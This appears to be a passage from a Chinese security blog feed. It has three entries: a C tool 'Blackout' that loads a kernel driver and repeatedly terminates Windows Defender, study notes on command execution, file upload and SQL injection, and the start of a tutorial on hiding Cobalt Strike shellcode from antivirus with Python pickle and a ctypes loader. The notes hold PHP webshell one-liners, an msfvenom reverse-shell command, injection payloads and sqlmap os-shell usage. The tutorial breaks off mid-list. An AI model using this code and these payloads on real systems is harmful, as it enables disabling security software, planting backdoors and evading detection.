<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span></span></span><br><span class="line"><span class="function"><span class="title">main</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">int</span> argc,</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">char</span>** argv</span></span></span><br><span class="line"><span class="params"><span class="function">)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid number of arguments. Usage: Blackout.exe -p &lt;process_id&gt;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-p&quot;</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Invalid argument. Usage: Blackout.exe -p &lt;process_id&gt;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">CheckProcess</span>(<span class="built_in">atoi</span>(argv[<span class="number">2</span>])))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;provided process id doesnt exist !!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    WIN32_FIND_DATAA fileData;</span><br><span class="line">    HANDLE hFind;</span><br><span class="line">    <span class="type">char</span> FullDriverPath[MAX_PATH];</span><br><span class="line">    BOOL once = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    hFind = <span class="built_in">FindFirstFileA</span>(<span class="string">&quot;Blackout.sys&quot;</span>, &amp;fileData);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hFind != INVALID_HANDLE_VALUE) &#123; <span class="comment">// file is found</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">GetFullPathNameA</span>(fileData.cFileName, MAX_PATH, FullDriverPath, <span class="literal">NULL</span>) != <span class="number">0</span>) &#123; <span class="comment">// full path is found</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;driver path: %s\n&quot;</span>, FullDriverPath);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;path not found !!\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;driver not found !!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Loading %s driver .. \n&quot;</span>, fileData.cFileName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">LoadDriver</span>(FullDriverPath))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;faild to load driver ,try to run the program as administrator!!\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;driver loaded successfully !!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    HANDLE hDevice = <span class="built_in">CreateFile</span>(<span class="string">L&quot;\\\\.\\Blackout&quot;</span>, GENERIC_WRITE | GENERIC_READ, <span class="number">0</span>, <span class="literal">NULL</span>, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Failed to open handle to driver !! &quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    DWORD bytesReturned = <span class="number">0</span>;</span><br><span class="line">    DWORD input = <span class="built_in">atoi</span>(argv[<span class="number">2</span>]);</span><br><span class="line">    DWORD output[<span class="number">2</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    DWORD outputSize = <span class="built_in">sizeof</span>(output);</span><br><span class="line"></span><br><span class="line">    BOOL result = <span class="built_in">DeviceIoControl</span>(hDevice, INITIALIZE_IOCTL_CODE, &amp;input, <span class="built_in">sizeof</span>(input), output, outputSize, &amp;bytesReturned, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (!result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;faild to send initializing request %X !!\n&quot;</span>, INITIALIZE_IOCTL_CODE);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;driver initialized %X !!\n&quot;</span>, INITIALIZE_IOCTL_CODE);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">GetPID</span>(<span class="string">L&quot;MsMpEng.exe&quot;</span>) == input)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Terminating Windows Defender ..\nkeep the program running to prevent the service from restarting it\n&quot;</span>);</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">0x1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (input = <span class="built_in">GetPID</span>(<span class="string">L&quot;MsMpEng.exe&quot;</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">DeviceIoControl</span>(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, &amp;input, <span class="built_in">sizeof</span>(input), output, outputSize, &amp;bytesReturned, <span class="literal">NULL</span>))</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;DeviceIoControl failed. Error: %X !!\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">                    <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">                    <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (once)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;Defender Terminated ..\n&quot;</span>);</span><br><span class="line">                    once = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">700</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;terminating process !! \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    result = <span class="built_in">DeviceIoControl</span>(hDevice, TERMINSTE_PROCESS_IOCTL_CODE, &amp;input, <span class="built_in">sizeof</span>(input), output, outputSize, &amp;bytesReturned, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!result)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed to terminate process: %X !!\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;process has been terminated!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="运行测试-1"><a href="#运行测试-1" class="headerlink" title="运行测试"></a>运行测试</h2><img src="WeakDefender/241086198-3ea0f7ae-0102-4a38-b4b6-700e93f5d545.png" alt="image" style="zoom:67%;" />	



<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul>
<li><a href="https://www.freebuf.com/articles/network/324952.html">https://www.freebuf.com/articles/network/324952.html</a></li>
<li><a href="https://xz.aliyun.com/t/12280#toc-25">https://xz.aliyun.com/t/12280#toc-25</a></li>
</ul>
]]></content>
  </entry>
  <entry>
    <title>Web-命令执行、Web-文件上传</title>
    <url>/2023/04/25/Web-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E3%80%81Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<h1 id="Web-命令执行、Web-文件上传"><a href="#Web-命令执行、Web-文件上传" class="headerlink" title="Web-命令执行、Web-文件上传"></a>Web-命令执行、Web-文件上传</h1><h2 id="1-常用的一些linux命令"><a href="#1-常用的一些linux命令" class="headerlink" title="1.常用的一些linux命令"></a>1.常用的一些linux命令</h2><ol>
<li><strong>Curl</strong><br> $ curl url      不带任何参数时，curl就是发出GET请求</li>
<li>Nc<br> nc也可以传文件，远程控制**<br> Nc -lvp 5500 &lt;1.txt</li>
<li>BP<br> kali自带的字典路径 usr&#x2F;share&#x2F;wordlists&#x2F;metasploit</li>
</ol>
<h1 id="web相关"><a href="#web相关" class="headerlink" title="web相关"></a>web相关</h1><ol>
<li><p>browser&amp;server</p>
</li>
<li><p>forntend&amp;backend<br> 看得到的 Html，JavaScript，css<br> 看不到的 Apache，php，mysql，nodejs</p>
</li>
<li><p>服务器server，作用管理文档<br> kali自带了apache（80端口）</p>
</li>
<li><p>post和response的区别 协议不对称</p>
</li>
<li><p>cookie&amp;session</p>
</li>
</ol>
<h1 id="php特性"><a href="#php特性" class="headerlink" title="php特性"></a>php特性</h1><ol>
<li><p>读取文件命令<br>cat、tac、head、tail、more、less、xxd、od、nl、gerp、strings、cut、grep、sed、awk、base64、read、printf</p>
</li>
<li><p>操作文件命令<br>cp、mv、ln<br>测试crul的国外网站 pipedream</p>
</li>
<li><p>文件头检查<br>图片马（只检查前两个字节）  一句话木马 copy命令实现<br> auto_prepeng_file&#x3D;1.png  自动追加<br>1.png</p>
<?=phpinfo();?>
<p> Index.php</p>
</li>
</ol>
<p>使用专门的文件服务器，如MINIO、CEPH等<br>Minio:<a href="https://www.minio.org.cn/">https://www.minio.org.cn/</a></p>
<p>Webshell<br>Eval 、assert<br><?=echo eval($_GET[1])?><br>?1&#x3D;system(“id”);</p>
<p>一句话木马 <?=echo eval($_POST[1])?><br>管理工具：中国菜刀，蚁剑、<br>        weevely：生成webshell，密码<br>            weevely generat 123 shell.php 生成webshell，密码<br>            Weevely url 123 连接weevely<br>        Webacoo：生成后门，连接webshell<br>        Behinder（冰蝎）<br>        Godzilla（哥斯拉）：java -jar godzilla.jar<br>        反弹shell:msfvennom  -p php&#x2F;reverse_php LhoST &#x3D;IP  -f raw &gt;reverse .php<br>小马：比较简单的webshell管理<br>大马：比较复杂的webshell管理工具（带web界面）</p>
<p>文件包含<br>原理：<br>常见函数：<br>include()	文件不存在会告警，但是会继续执行<br>Include_once()	只执行一次<br>Require()	文件不存在会告警，但是会继续执行<br>Require_once	只执行一次<br>File_get_contents	将文件内容读入到字符串（类似curl）<br>Popen()	</p>
<h1 id="jsp常见引入其他文件方式"><a href="#jsp常见引入其他文件方式" class="headerlink" title="jsp常见引入其他文件方式"></a>jsp常见引入其他文件方式</h1><pre><code>## 
</code></pre>
<p>data协议 P96<br>协议头data:&#x2F;&#x2F;<br>类型：text&#x2F;plain;base64<br>内容：xxx<br>Data:&#x2F;&#x2F;text&#x2F;plain,xxx;base64,eHh4eA&#x3D;&#x3D;</p>
<p>未指定  &#x3D;&#x3D;&gt;	Tmp<br>Session_ff348165938f80c9f590d482b899e260 </p>
<p>文件包含防御</p>
<h1 id="过滤文件"><a href="#过滤文件" class="headerlink" title="过滤文件"></a>过滤文件</h1><p>1.白名单校验<br>    Allow_file&#x3D; [<br>    ‘Index.php’<br>    ‘Footer.php’<br>    Header.php’<br>    ]<br>2.指定可以包含的目录<br>Basename	获取文件<br>dirname	获取文件所在路径</p>
<pre><code>allow = [&#39;.txt&#39;,&#39;.html&#39;,…] 
</code></pre>
<p> 例如只允许  &#x2F;var&#x2F;www&#x2F;html<br>dirname 获取文件所在路径，校验允许包含的路径   &#x2F;var&#x2F;www&#x2F;html<br>dirname &#x2F;var&#x2F;log&#x2F;nginx&#x2F;accsee.log &#x3D;&gt;   &#x2F;var&#x2F;log&#x2F;nginx 发现不在白名单<br>Disable_function绕过，通过反引号可以绕过</p>
<p>SQL注入<br>数据存在表中，<br>增删改查：select&#x2F;insert&#x2F;update&#x2F;delete</p>
<p>DQL 	查询语句（select）<br>DML	 操作语句（insert&#x2F;update&#x2F;delete）<br>DDL	定义语句（创建表、修改表格结构等）<br>DCL	控制语句</p>
<p>MySQL<br>库 &gt; 表 （列） &gt;行记录（数据）<br>DQL 基本构成<br>Select [列] from [数据库] [表名] where {条件}  {分组} {排序}<br>条件连接符:and or &amp;  |<br>条件匹配：&#x3D; &lt;&gt; not like（任意字符：%）<br>分组：group by [列,…] having {条件}<br>排序：order by [列,…] [SORT_ASC|SORT _DESC]<br>                   升序           降序<br>限制输出：limit 起始位置，偏移<br>注释符：#、–[空格]、<br>拼接函数    concat，concat_ws<br>concat_ws(‘,’,’a’,’b’)—–&gt;print  a,b<br>group_concat()  把多行合并成一行</p>
<p>1.判断列数<br>    oder by 数字     —-可以通过2分法判断列数<br>select * from user where usermame &#x3D; 1 and password &#x3D;1 ;group table user;<br>                                                        堆叠注入<br>select col1,col2,col3，* from user where id&#x3D;’输入’or  1&#x3D;1%23</p>
<p>Union 联合注入<br>information_schema 记录了所有的数据库信息、表信息、列信息、权限信息等<br>                    1.记录数据库信息的表 schema<br>                        select schema_name from information_schema.schema;<br>                    2.记录数据表信息的表 tables(table_name,table_schame)<br>                        select table_name from information_schema.tables where table_schame &#x3D; ‘test’<br>                    3.记录数据表列信息的表 columns (columns_name,table_name,table_schame)<br>                        select column_name from information_schema.columns where table_name &#x3D; ‘test<br>                        ‘<br>数字型注入：输入内容未被引号包裹    select * from user where id &#x3D;1<br>字符型注入：<br>    1.单引号注入<br>    2.双引号注入</p>
<p>盲注：不会回显执行结果<br>&#x2F;&#x2F;在kali查看acsii码的方法 man ascii<br>字符串截取：<br>    substr()      select substr(user()，1,1)&#x3D; ‘a’<br>    mid()         select mid(user()，1,1)&#x3D; ‘a’<br>        此处需要注意，单引号可能会被注释掉，所以需要使用ascii码<br>    ascii()   将字符串转成ascii码数值（十进制）<br>        ASCII可打印字符 33-126之间<br>  时间盲注：select<br>    条件判断：if(条件，真值分支，假值分支)<br>              ifnul() &#x3D;&#x3D; if(值&#x3D;null,1,0)<br>              case when(条件 1&#x3D;1) then when(条件2 1&#x3D;2) …   else…END<br>           小技巧 awk命令 通过%c 把数值（十进制）转换成ascii<br>报错注入：通过恶意输入，控制报错内容来读取资料<br>             XML functions：1.ExtractValue</p>
<ol>
<li><p>宽字节注入：利用中文特性，使用超出ASCII码表（大于80）展示，会被当做半个中文；<br>     由于添加的转义字符也是半个中文，他们组合在一起相当于一个中文，这时候转义字符（\）失去转义功能。<br>     合法范围：00-FF，一般注入使用%df<br> 1 个中文 &#x3D;&#x3D; 2 个ascii</p>
</li>
<li><p>二次注入：第一次传入恶意的sql组装片段，并不触发注入行为，但是会被保存。<br>     第二次查询的时候引用了存错的恶意sql注入组装片段，导致SQL注入行为。<br>    insert into user (username) value (“xxx”)<br>             username 输入： xxx’ or 1&#x3D;1 #<br>    select * from user where username&#x3D;’xxx’</p>
</li>
<li><p>insert注入：用户可以控制插入（insert、update）语句的注入  #的作用是把后面的字符注释掉<br>    insert into user (username,password) value (‘输入’,’输入’);<br>    insert into user (username,password) value (‘1’,user())#,’输入’);</p>
</li>
<li><p>读写文件（受限secure_file_priv,允许读写的目录，为空则不受限制）<br>     load_file(文件路径)<br>         select load_file(‘&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;2.txt’)<br>     into outfile 路径<br>         select .. into outfile ‘&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;2.txt’</p>
</li>
<li><p>绕过方式<br> 关键词过滤：大小写、双写、等价替换<br> 关键词被过滤： 引号–&gt;16进制编码<br>   可以用 and or  xor 等，&amp;&amp; || | !<br>   or –&gt;  oorr  –&gt;or<br>   or –&gt;  |<br>   select * from user where id &#x3D;’1’ or ‘1’&#x3D;’1’</p>
</li>
<li><p>sqlmap<br> 强大的sql注入工具，检测是否sql注入<br> 语法：sqlmap -u URL<br>       sqlmap -r 请求报文文件<br>    –dbs                                           查询数据库<br>    –tables -D  数据库名称                         查询指定数据库下的表<br>    –cloumns -D 数据库名称 -T 数据表名称           查询指定数据库下的指定表的列<br>    –dump -D 数据库名称 -T数据表名称 -C 指定列，…查询数据<br>    –sql-shell                                     获取sql的cmd命令行(只支持增删改查)<br>    –os-shell                                      获取远程控制<br>    –tamper                                        指定一些绕过处理，绕过一些过滤，<br>                                                    kali自带的比较好用的脚本,路径在 &#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;temper，其中spaceconment.py比较好用，转换空格<br>                                                    例如：sqlmap -u URL –temper spaceconment –dbs</p>
</li>
</ol>
]]></content>
  </entry>
  <entry>
    <title></title>
    <url>/2024/04/29/Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%8D%E6%9D%80/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章主要用到python来对CobaltStrike生成的Shellcode进行分离免杀处理, 因此要求读者要有一定的python基础, 下面我会介绍pyhon反序列化免杀所需用到的相关函数和库</p>
<h2 id="exec函数"><a href="#exec函数" class="headerlink" title="exec函数"></a>exec函数</h2><p><code>exec</code>函数是python的内置函数, 其功能与eval()函数相同, 但不同的是exec函数支持多行python代码的执行, 而eval()函数仅支持单行</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;&quot;&quot;String = &quot;HelloWorld&quot;</span></span><br><span class="line"><span class="string">print(String)&quot;&quot;&quot;</span>) </span><br><span class="line"></span><br><span class="line"><span class="comment">#在上述的exec执行的python代码中定义了String变量,因此能进行输出</span></span><br><span class="line"><span class="built_in">print</span>(String) </span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">代码执行结果:</span></span><br><span class="line"><span class="string">HelloWorld</span></span><br><span class="line"><span class="string">HelloWorld</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="pickle模块"><a href="#pickle模块" class="headerlink" title="pickle模块"></a>pickle模块</h2><p>pickle模块能实现任意对象与文本之间的相互转换, 也可实现任意对象和二进制之间的相互转换, 也就是说pickle能实现python对象的存储及恢复</p>
<p>python中几乎所有的数据类型(列表,字典,集合,类等等)都可以用pickle来序列化, 序列化的数据可读性差且难识别, 通常用于存储数据</p>
<h3 id="pickle-dumps-obj"><a href="#pickle-dumps-obj" class="headerlink" title="pickle.dumps(obj)"></a><code>pickle.dumps(obj)</code></h3><p>dumps功能将数据转换成只有python语言认识的字符串</p>
<ul>
<li>参数<code>obj</code>: 要封装的对象</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">data = [<span class="string">&#x27;henry&#x27;</span>,<span class="string">&#x27;helloworld&#x27;</span>,<span class="number">123</span>]</span><br><span class="line">p_str = pickle.dumps(data)</span><br><span class="line"><span class="built_in">print</span>(p_str)</span><br><span class="line"><span class="comment">#输出b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x05henry\x94\x8c\nhelloworld\x94K&#123;e.&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="pickle-loads-bytes-obj"><a href="#pickle-loads-bytes-obj" class="headerlink" title="pickle.loads(bytes_obj)"></a><code>pickle.loads(bytes_obj)</code></h3><p>loads功能将pickle数据转换成python的数据结构</p>
<ul>
<li>参数<code>bytes_obj</code>: <code>pickle_dumps</code>后的数据对象</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">data = [<span class="string">&#x27;henry&#x27;</span>,<span class="string">&#x27;helloworld&#x27;</span>,<span class="number">123</span>]</span><br><span class="line">p_str = pickle.dumps(data)</span><br><span class="line"><span class="built_in">print</span>(p_str)</span><br><span class="line"></span><br><span class="line"><span class="built_in">str</span> = pickle.loads(p_str)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line"><span class="comment">#输出:[&#x27;henry&#x27;, &#x27;helloworld&#x27;, 123]</span></span><br></pre></td></tr></table></figure>



<h3 id="pickle-dump-obj-file-protocol"><a href="#pickle-dump-obj-file-protocol" class="headerlink" title="pickle.dump(obj,file,[protocol])"></a><code>pickle.dump(obj,file,[protocol])</code></h3><p>序列化对象, 并将结果数据流写入文件file中</p>
<ul>
<li><p>必填参数<code>obj</code>: 将要封装的对象</p>
</li>
<li><p>必填参数<code>file</code>: 要写入的文件对象, file必须以二进制模式打开</p>
</li>
<li><p>参数<code>protocol</code>: 代表序列化模式, 默认值为0, 表示以文本的形式进行序列化, protocol的值为1或2时表示以二进制的形式序列化</p>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">data = [<span class="string">&#x27;henry&#x27;</span>,<span class="string">&#x27;helloworld&#x27;</span>,<span class="number">123</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dump.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    pickle.dump(data,file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dump.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="built_in">print</span>(file.read()) <span class="comment">#输出:b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00]\x94(\x8c\x05henry\x94\x8c\nhelloworld\x94K&#123;e.&#x27;</span></span><br></pre></td></tr></table></figure>



<h3 id="pickle-load-file"><a href="#pickle-load-file" class="headerlink" title="pickle.load(file)"></a><code>pickle.load(file)</code></h3><p>反序列化对象, 将文件中的数据解析为一个python对象</p>
<ul>
<li>必填参数<code>file</code>: 存有pickle数据的文件对象</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">data = [<span class="string">&#x27;henry&#x27;</span>,<span class="string">&#x27;helloworld&#x27;</span>,<span class="number">123</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dump.txt&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    pickle.dump(data,file)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;dump.txt&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="built_in">print</span>(pickle.load(file)) <span class="comment">#输出:[&#x27;henry&#x27;, &#x27;helloworld&#x27;, 123]</span></span><br></pre></td></tr></table></figure>



<h2 id="类特殊方法-reduce"><a href="#类特殊方法-reduce" class="headerlink" title="类特殊方法:__reduce__"></a>类特殊方法:<code>__reduce__</code></h2><p>当定义扩展类型时(即使用python的C语言API实现的类型), 若你想pickle这些类型, 你必须告诉python如何去pickle</p>
<p><code>__reduce__</code>方法在类中被定义后, 当对象被pickle时就会被调用, 它要么返回一个代表全局名称的字符串, python会查找此字符串并pickle; 要么返回一个元组, 此元组包含2到5个元素, 第一个元素为可调用的对象, 用于重建对象时调用; 第二个元素是参数元素(必须为元组), 供可调用对象(第一个元素)使用; 另外三个元素分别是: 被传递给<code>__setstate__</code>的状态(可选)、一个产生被pickle的列表元素的迭代器(可选)、一个产生被pickle的字典元素的迭代器(可选)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">shellcode = <span class="string">&quot;list1 = [1,2,3,4]&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">   <span class="keyword">def</span> <span class="title function_">__reduce__</span>(<span class="params">self</span>):</span><br><span class="line">       <span class="keyword">return</span> (<span class="built_in">exec</span>,(shellcode,))</span><br><span class="line"></span><br><span class="line"><span class="comment">#当实例对象被pickle后,则会调用特殊方法__reduce__,所以下列代码相当于pickle.dumps((exec,(shellcode,)))</span></span><br><span class="line">ret = pickle.dumps(A())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(ret)</span><br><span class="line"><span class="comment">#输出:b&#x27;\x80\x04\x95-\x00\x00\x00\x00\x00\x00\x00\x8c\x08builtins\x94\x8c\x04exec\x94\x93\x94\x8c\x11list1 = [1,2,3,4]\x94\x85\x94R\x94.&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="Cryptography"><a href="#Cryptography" class="headerlink" title="Cryptography"></a>Cryptography</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Cryptography是python语言中非常著名的加解密库，在算法层面提供了高层次的抽象，使用起来非常简单、直观，同时还保留了各种不同算法的低级别接口，保留灵活性</p>
<p>我们知道加密一般分为对称加密(Symmetric Key Encryption)和非对称加密(Asymmetric Key Encryption)。各自对应多种不同的算法，每种算法又有不同的密钥位长要求，另外还涉及到不同的分组加密模式，以及末尾补齐方式。因此需要高层次的抽象，把这些参数封装起来，让我们使用时，不用关心这么多参数，只要知道这么用足够安全就够了</p>
<p>对称加密又分为分组加密和序列加密，本文只讨论对称分组加密</p>
<ul>
<li>主流对称分组加密算法：DES、3DES、AES</li>
<li>主流对称分组加密模式：ECB、CBC、CFB、OFB</li>
<li>主流填充标准：PKCS7、ISO 10126、ANSI X.923、Zero padding</li>
</ul>
<p>在cryptography库中，对称加密算法的抽象是fernet模块，包括了对数据的加解密以及签名验证功能，以及密钥过期机制，该模块采用了如下定义：</p>
<ul>
<li>加解密算法为AES，密钥位长128，CBC模式，填充标准PKCS7</li>
<li>签名算法为SHA256的HMAC，密钥位长128位</li>
<li>密钥可以设置过期时间</li>
</ul>
<h3 id="使用实例"><a href="#使用实例" class="headerlink" title="使用实例"></a>使用实例</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> cryptography.fernet <span class="keyword">import</span> Fernet</span><br><span class="line"></span><br><span class="line">String = <span class="string">b&quot;Hello World&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#生成密钥</span></span><br><span class="line">key = Fernet.generate_key()</span><br><span class="line"><span class="built_in">print</span>(key) <span class="comment">#输出key: b&#x27;wmCNyvzUekp_JWEHUcTy4vS2qMrWDXbKOfTooYD1WiI=&#x27;</span></span><br><span class="line">f_obj = Fernet(key) <span class="comment">#定义一个用于实现加密和解密方法的对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#进行加密</span></span><br><span class="line">encrypt_String = f_obj.encrypt(String)</span><br><span class="line"><span class="built_in">print</span>(encrypt_String) <span class="comment">#输出加密后的内容: b&#x27;gAAAAABjetNK7sjOoosLI-KcPGdwvQQJVnhwYR9JIeGUx3hJ3qKOQXkaKiGgrlj8wr-tMZdhFKcoK75oONPP4rEDVna5cITQ9g==&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#进行解密</span></span><br><span class="line">decrypt_String = f_obj.decrypt(encrypt_String)</span><br><span class="line"><span class="built_in">print</span>(decrypt_String) <span class="comment">#输出解密后的内容: b&#x27;Hello World&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="Ctypes库"><a href="#Ctypes库" class="headerlink" title="Ctypes库"></a>Ctypes库</h2><p>Ctypes 是 Python 的外部函数库。提供了与 C 兼容的数据类型，并允许调用 DLL 或共享库中的函数。可使用该模块以纯 Python 形式对这些库进行封装</p>
<p>而本编文章主要调用系统DLL的函数有<code>VirtualAlloc</code>、<code>RtlMoveMemory</code>、<code>CreateThread</code>、<code>WaitForSingleObject</code>, 这些函数后文都会讲述</p>
<h1 id="ShellCode加载器"><a href="#ShellCode加载器" class="headerlink" title="ShellCode加载器"></a>ShellCode加载器</h1><h2 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h2><p>要实现所谓的Shellcode加载器, 其实只需以下四个步骤:</p>
<ul>
<li><code>VirtualAlloc</code>函数开辟内存空间</li>
<li><code>RtlMoveMemory</code>函数将Shellcode加载至此内存空间</li>
<li><code>CreateThread</code>创建线程执行此段内存空间的内容</li>
